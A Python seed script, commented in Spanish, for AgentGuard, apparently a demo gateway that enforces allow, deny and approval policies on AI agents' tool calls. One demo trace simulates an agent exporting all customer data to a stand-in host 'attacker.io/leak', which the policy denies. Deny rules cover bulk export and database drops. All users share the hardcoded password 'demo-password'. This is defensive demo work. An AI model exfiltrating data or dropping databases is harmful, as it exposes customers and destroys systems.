"""Script de Inicialización y Semillas de Datos para AgentGuard (Demo Oficial).

Puebla la base de datos PostgreSQL con la organización corporativa, usuarios con roles,
agentes de IA, herramientas externas, capacidades (AgentTool), políticas contextuales
y reglas deterministas requeridas para ejecutar los 4 escenarios de la demo académica
y los flujos del Frontend Dashboard.

Todos los identificadores clave son generados dinámicamente por PostgreSQL (gen_random_uuid)
y las trazas iniciales se ejecutan de forma real a través del PEPGatewayService.

Uso:
    python -m scripts.seed_demo [--reset]
    o desde la raíz: python scripts/seed_demo.py [--reset]
"""

import argparse
import asyncio
import logging
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Tuple

# Asegurar backend en sys.path
backend_path = Path(__file__).resolve().parent.parent
if str(backend_path) not in sys.path:
    sys.path.insert(0, str(backend_path))

from sqlalchemy import delete, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.database import AsyncSessionLocal
from app.core.security import get_password_hash
from app.models.agent import Agent, AgentTool
from app.models.alert import Alert
from app.models.approval import Approval
from app.models.enums import (
    AgentStatus,
    RiskLevel,
    RuleEffect,
    UserRole,
)
from app.models.execution import Execution
from app.models.organization import Organization
from app.models.policy import Policy, PolicyRule
from app.models.tool import Tool, ToolAction
from app.models.user import User
from app.schemas.gateway import GatewayExecuteRequest
from app.services.pep_gateway_service import pep_gateway_service

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("agentguard.seed")

# ==============================================================================
# Constantes Descriptivas Canónicas (Sin UUIDs hardcodeados)
# ==============================================================================

CANONICAL_ORG_NAME = "Acme Corp"
CANONICAL_ADMIN_EMAIL = "admin@acmecorp.com"

CANONICAL_ACME_USERS: Tuple[Tuple[str, UserRole], ...] = (
    ("admin@acmecorp.com", UserRole.ADMIN),
    ("approver@acmecorp.com", UserRole.APPROVER),
    ("operator@acmecorp.com", UserRole.OPERATOR),
    ("auditor@acmecorp.com", UserRole.AUDITOR),
    ("viewer@acmecorp.com", UserRole.VIEWER),
)


async def _resolve_demo_org(session: AsyncSession) -> Optional[Organization]:
    """Busca la organización demo Acme Corp por email del admin o por nombre canónico."""
    # 1. Buscar primero al usuario CANONICAL_ADMIN_EMAIL (incluso si la org fue renombrada)
    admin_stmt = select(User).where(User.email == CANONICAL_ADMIN_EMAIL)
    admin_res = await session.execute(admin_stmt)
    admin_user = admin_res.scalar_one_or_none()
    if admin_user and admin_user.organization_id:
        org = await session.get(Organization, admin_user.organization_id)
        if org:
            return org

    # 2. Fallback a Organization.name == CANONICAL_ORG_NAME
    org_stmt = select(Organization).where(Organization.name == CANONICAL_ORG_NAME)
    org_res = await session.execute(org_stmt)
    return org_res.scalar_one_or_none()


async def clear_database(session: AsyncSession, org_id: uuid.UUID) -> None:
    """Limpia en cascada únicamente las tablas operativas de la organización Acme Corp."""
    logger.warning("Reseteando datos existentes de la organización Acme Corp (%s)...", org_id)
    await session.execute(delete(Alert).where(Alert.organization_id == org_id))
    await session.execute(delete(Approval).where(
        Approval.execution_id.in_(
            select(Execution.id).where(Execution.organization_id == org_id)
        )
    ))
    await session.execute(delete(Execution).where(Execution.organization_id == org_id))
    await session.execute(delete(PolicyRule).where(
        PolicyRule.policy_id.in_(
            select(Policy.id).where(Policy.organization_id == org_id)
        )
    ))
    await session.execute(delete(Policy).where(Policy.organization_id == org_id))
    await session.execute(delete(AgentTool).where(
        AgentTool.agent_id.in_(
            select(Agent.id).where(Agent.organization_id == org_id)
        )
    ))
    await session.execute(delete(ToolAction).where(
        ToolAction.tool_id.in_(
            select(Tool.id).where(Tool.organization_id == org_id)
        )
    ))
    await session.execute(delete(Tool).where(Tool.organization_id == org_id))
    await session.execute(delete(Agent).where(Agent.organization_id == org_id))
    await session.execute(delete(User).where(User.organization_id == org_id))
    await session.execute(delete(Organization).where(Organization.id == org_id))
    await session.commit()
    logger.info("Limpieza completada.")


async def ensure_canonical_demo_users(
    session: AsyncSession,
    org_id: uuid.UUID,
    now: datetime,
) -> Tuple[int, int]:
    """Sincroniza usuarios RBAC faltantes o sin hash sobre la organización dada."""
    canonical_emails = [email for email, _ in CANONICAL_ACME_USERS]
    result = await session.execute(
        select(User).where(User.email.in_(canonical_emails))
    )
    existing_users = list(result.scalars().all())
    by_email = {user.email: user for user in existing_users}

    default_pwd_hash: Optional[str] = None
    created = 0
    updated = 0

    for email, role in CANONICAL_ACME_USERS:
        existing = by_email.get(email)
        if existing is not None:
            if existing.organization_id == org_id and not existing.hashed_password:
                if default_pwd_hash is None:
                    default_pwd_hash = get_password_hash("demo-password")
                existing.hashed_password = default_pwd_hash
                updated += 1
            continue

        if default_pwd_hash is None:
            default_pwd_hash = get_password_hash("demo-password")
        new_user = User(
            organization_id=org_id,
            email=email,
            hashed_password=default_pwd_hash,
            role=role,
            created_at=now,
        )
        session.add(new_user)
        created += 1

    return created, updated


async def seed_data(reset: bool = False) -> uuid.UUID:
    """Puebla todas las entidades requeridas para la demo oficial con UUIDs generados por Postgres."""
    now = datetime.now(timezone.utc)

    async with AsyncSessionLocal() as session:
        # Verificar si la organización ya existe por admin email o nombre
        existing_org = await _resolve_demo_org(session)
        if existing_org:
            if reset:
                await clear_database(session, org_id=existing_org.id)
            else:
                created_users, updated_users = await ensure_canonical_demo_users(session, existing_org.id, now)
                if created_users or updated_users:
                    await session.commit()
                    logger.info(
                        "Organización Acme Corp sincronizada sin --reset (%s usuario(s) nuevo(s), %s hash(es) completado(s)).",
                        created_users,
                        updated_users,
                    )
                else:
                    logger.info("La organización Acme Corp ya existe con todos los usuarios demo activos. Usa --reset para recrear.")
                return existing_org.id

        logger.info("Iniciando creación de semillas oficiales de AgentGuard con UUIDs dinámicos...")

        # 1. Organización Raíz (Tenant) sin ID explícito
        org = Organization(
            name=CANONICAL_ORG_NAME,
            created_at=now,
        )
        session.add(org)
        await session.flush()
        if org.id is None:
            org.id = uuid.uuid4()

        # 2. Usuarios Corporativos
        default_pwd_hash = get_password_hash("demo-password")
        user_admin = User(
            organization_id=org.id,
            email="admin@acmecorp.com",
            hashed_password=default_pwd_hash,
            role=UserRole.ADMIN,
            created_at=now,
        )
        user_approver = User(
            organization_id=org.id,
            email="approver@acmecorp.com",
            hashed_password=default_pwd_hash,
            role=UserRole.APPROVER,
            created_at=now,
        )
        user_operator = User(
            organization_id=org.id,
            email="operator@acmecorp.com",
            hashed_password=default_pwd_hash,
            role=UserRole.OPERATOR,
            created_at=now,
        )
        user_auditor = User(
            organization_id=org.id,
            email="auditor@acmecorp.com",
            hashed_password=default_pwd_hash,
            role=UserRole.AUDITOR,
            created_at=now,
        )
        user_viewer = User(
            organization_id=org.id,
            email="viewer@acmecorp.com",
            hashed_password=default_pwd_hash,
            role=UserRole.VIEWER,
            created_at=now,
        )
        demo_users = [user_admin, user_approver, user_operator, user_auditor, user_viewer]
        session.add_all(demo_users)
        await session.flush()
        for u in demo_users:
            if u.id is None:
                u.id = uuid.uuid4()

        # 3. Agentes de IA
        agent_sales = Agent(
            organization_id=org.id,
            owner_user_id=user_admin.id,
            name="Agente de Ventas",
            purpose="Gestión comercial, cotizaciones para clientes y reembolsos autorizados.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        agent_finance = Agent(
            organization_id=org.id,
            owner_user_id=user_admin.id,
            name="Finance Copilot",
            purpose="Conciliación de pagos, facturación e informes financieros.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        agent_support = Agent(
            organization_id=org.id,
            owner_user_id=user_admin.id,
            name="Support Assistant",
            purpose="Atención a clientes y consulta de tickets en Zendesk.",
            status=AgentStatus.ACTIVE,
            created_at=now,
        )
        demo_agents = [agent_sales, agent_finance, agent_support]
        session.add_all(demo_agents)
        await session.flush()
        for a in demo_agents:
            if a.id is None:
                a.id = uuid.uuid4()

        # 4. Herramientas Externas (Tools)
        tool_crm = Tool(
            organization_id=org.id,
            name="CRM & Facturación",
            protocol="REST",
            endpoint_url="https://crm.api.corp",
            description="API empresarial de CRM y gestión de facturación a clientes.",
            created_at=now,
        )
        tool_stripe = Tool(
            organization_id=org.id,
            name="Stripe Payments",
            protocol="REST",
            endpoint_url="https://stripe.api.corp",
            description="Pasarela de pagos y reembolsos de transacciones.",
            created_at=now,
        )
        tool_catalog = Tool(
            organization_id=org.id,
            name="Catálogo de Precios",
            protocol="REST",
            endpoint_url="https://pricing.api.corp",
            description="Base de datos de precios de lista y catálogo comercial.",
            created_at=now,
        )
        tool_db = Tool(
            organization_id=org.id,
            name="Database Administrator",
            protocol="REST",
            endpoint_url="https://db.api.corp",
            description="Gestor de base de datos relacional y mantenimiento de esquemas.",
            created_at=now,
        )
        demo_tools = [tool_crm, tool_stripe, tool_catalog, tool_db]
        session.add_all(demo_tools)
        await session.flush()
        for t in demo_tools:
            if t.id is None:
                t.id = uuid.uuid4()

        # 5. Acciones Atómicas (ToolActions) con Nivel de Riesgo
        act_quote = ToolAction(
            tool_id=tool_crm.id,
            action_name="create_quote",
            risk_level=RiskLevel.LOW,
            description="Emisión de cotización y presupuesto a cliente.",
            created_at=now,
        )
        act_export = ToolAction(
            tool_id=tool_crm.id,
            action_name="export_customers",
            risk_level=RiskLevel.CRITICAL,
            description="Exportación masiva de datos y listados de clientes.",
            created_at=now,
        )
        act_refund = ToolAction(
            tool_id=tool_stripe.id,
            action_name="refund",
            risk_level=RiskLevel.HIGH,
            description="Devolución y reembolso de dinero a cliente.",
            created_at=now,
        )
        act_update_price = ToolAction(
            tool_id=tool_catalog.id,
            action_name="update_price",
            risk_level=RiskLevel.HIGH,
            description="Modificación del precio de venta de un producto.",
            created_at=now,
        )
        act_drop_db = ToolAction(
            tool_id=tool_db.id,
            action_name="database.drop",
            risk_level=RiskLevel.CRITICAL,
            description="Eliminación destructiva de tablas o base de datos.",
            created_at=now,
        )
        demo_actions = [act_quote, act_export, act_refund, act_update_price, act_drop_db]
        session.add_all(demo_actions)
        await session.flush()
        for act in demo_actions:
            if act.id is None:
                act.id = uuid.uuid4()

        # 6. Asignación de Capacidades (AgentTool)
        cap_sales_crm = AgentTool(
            agent_id=agent_sales.id,
            tool_id=tool_crm.id,
            enabled=True,
            config={"max_requests_per_minute": 60},
            created_at=now,
        )
        cap_sales_stripe = AgentTool(
            agent_id=agent_sales.id,
            tool_id=tool_stripe.id,
            enabled=True,
            config={"currency": "USD"},
            created_at=now,
        )
        cap_finance_stripe = AgentTool(
            agent_id=agent_finance.id,
            tool_id=tool_stripe.id,
            enabled=True,
            config={},
            created_at=now,
        )
        cap_support_crm = AgentTool(
            agent_id=agent_support.id,
            tool_id=tool_crm.id,
            enabled=True,
            config={},
            created_at=now,
        )
        session.add_all([cap_sales_crm, cap_sales_stripe, cap_finance_stripe, cap_support_crm])

        # 7. Políticas de Autorización
        pol_sales = Policy(
            organization_id=org.id,
            name="Políticas de Operación y Seguridad para Agente de Ventas",
            description="Reglas comerciales de cotización, reembolsos y contención perimetral.",
            priority=100,
            is_active=True,
            created_at=now,
        )
        pol_global = Policy(
            organization_id=org.id,
            name="Guardrails Globales de Seguridad",
            description="Políticas estrictas anti-exfiltración y protección de infraestructura.",
            priority=200,
            is_active=True,
            created_at=now,
        )
        demo_policies = [pol_sales, pol_global]
        session.add_all(demo_policies)
        await session.flush()
        for p in demo_policies:
            if p.id is None:
                p.id = uuid.uuid4()

        # 8. Reglas de Autorización Deterministas (Evaluadas por el PDP)
        rule_quote_allow = PolicyRule(
            policy_id=pol_sales.id,
            priority=100,
            effect=RuleEffect.ALLOW,
            tool_action_id=act_quote.id,
            target_agent_id=agent_sales.id,
            conditions={"amount": {"lte": 10000}},
            created_at=now,
        )
        rule_refund_approval = PolicyRule(
            policy_id=pol_sales.id,
            priority=100,
            effect=RuleEffect.REQUIRE_APPROVAL,
            tool_action_id=act_refund.id,
            target_agent_id=None,
            conditions={"amount": {"gte": 500}},
            created_at=now,
        )
        rule_refund_allow = PolicyRule(
            policy_id=pol_sales.id,
            priority=50,
            effect=RuleEffect.ALLOW,
            tool_action_id=act_refund.id,
            target_agent_id=None,
            conditions={"amount": {"lt": 500}},
            created_at=now,
        )
        rule_export_deny = PolicyRule(
            policy_id=pol_global.id,
            priority=200,
            effect=RuleEffect.DENY,
            tool_action_id=act_export.id,
            target_agent_id=None,
            conditions={},
            created_at=now,
        )
        rule_drop_db_deny = PolicyRule(
            policy_id=pol_global.id,
            priority=300,
            effect=RuleEffect.DENY,
            tool_action_id=act_drop_db.id,
            target_agent_id=None,
            conditions={},
            created_at=now,
        )
        demo_rules = [
            rule_quote_allow,
            rule_refund_approval,
            rule_refund_allow,
            rule_export_deny,
            rule_drop_db_deny,
        ]
        session.add_all(demo_rules)
        await session.flush()
        for r in demo_rules:
            if r.id is None:
                r.id = uuid.uuid4()

        await session.commit()
        logger.info("[OK] Catálogo de entidades base persistido exitosamente en PostgreSQL.")

        # 9. Trazas Forenses Iniciales y Muestra vía Ejecución Real del Gateway (PEP)
        logger.info("Ejecutando las 3 trazas iniciales de demostración a través del PEPGatewayService...")

        # 9.1 Escenario 1: create_quote -> ALLOW
        res_quote = await pep_gateway_service.execute(
            db=session,
            request=GatewayExecuteRequest(
                organization_id=org.id,
                agent_id=agent_sales.id,
                tool_id=tool_crm.id,
                action_name="create_quote",
                parameters={"amount": 2500, "customer": "Acme Corp"},
                resource="quotes/QT-101",
                delegator_user_id=user_operator.id,
                dry_run=False,
            ),
        )

        # 9.2 Escenario 3: refund -> REQUIRE_APPROVAL (genera ticket Approval PENDING)
        res_refund = await pep_gateway_service.execute(
            db=session,
            request=GatewayExecuteRequest(
                organization_id=org.id,
                agent_id=agent_sales.id,
                tool_id=tool_stripe.id,
                action_name="refund",
                parameters={"amount": 4500, "customer_id": "cust-302", "reason": "damaged_goods"},
                resource="refunds/rf_9921",
                delegator_user_id=user_operator.id,
                dry_run=False,
            ),
        )

        # 9.3 Escenario 4: export_customers -> DENY + ALERT CRITICAL
        res_export = await pep_gateway_service.execute(
            db=session,
            request=GatewayExecuteRequest(
                organization_id=org.id,
                agent_id=agent_sales.id,
                tool_id=tool_crm.id,
                action_name="export_customers",
                parameters={"destination": "https://attacker.io/leak"},
                resource="customers/all",
                delegator_user_id=None,
                dry_run=False,
            ),
        )

        logger.info("====================================================================")
        logger.info("[OK] ¡Semillas de demostración de AgentGuard creadas con éxito!")
        logger.info("====================================================================")
        logger.info("  Organización: %s (%s)", org.name, org.id)
        logger.info("  Admin:        %s (%s)", user_admin.email, user_admin.id)
        logger.info("  Approver:     %s (%s)", user_approver.email, user_approver.id)
        logger.info("  Operator:     %s (%s)", user_operator.email, user_operator.id)
        logger.info("  Auditor:      %s (%s)", user_auditor.email, user_auditor.id)
        logger.info("  Viewer:       %s (%s)", user_viewer.email, user_viewer.id)
        logger.info("  Agente Demo:  %s (%s)", agent_sales.name, agent_sales.id)
        logger.info(
            "  Herramientas: CRM (%s), Stripe (%s), Catalogo (%s), DB (%s)",
            tool_crm.id,
            tool_stripe.id,
            tool_catalog.id,
            tool_db.id,
        )
        logger.info("  Trazas Reales Generadas en Runtime:")
        logger.info("    - Escenario 1 (ALLOW): execution_id=%s, latency=%sms", res_quote.execution_id, res_quote.latency_ms)
        logger.info("    - Escenario 3 (REQUIRE_APPROVAL): execution_id=%s, approval_id=%s", res_refund.execution_id, res_refund.approval_id)
        logger.info("    - Escenario 4 (DENY + ALERT): execution_id=%s, alert_id=%s", res_export.execution_id, res_export.alert_id)
        logger.info("====================================================================")

        return org.id


def main():
    parser = argparse.ArgumentParser(description="Poblar base de datos con semillas de la demo oficial")
    parser.add_argument("--reset", action="store_true", help="Elimina los datos previos de la demo antes de sembrar")
    args = parser.parse_args()

    asyncio.run(seed_data(reset=args.reset))


if __name__ == "__main__":
    main()
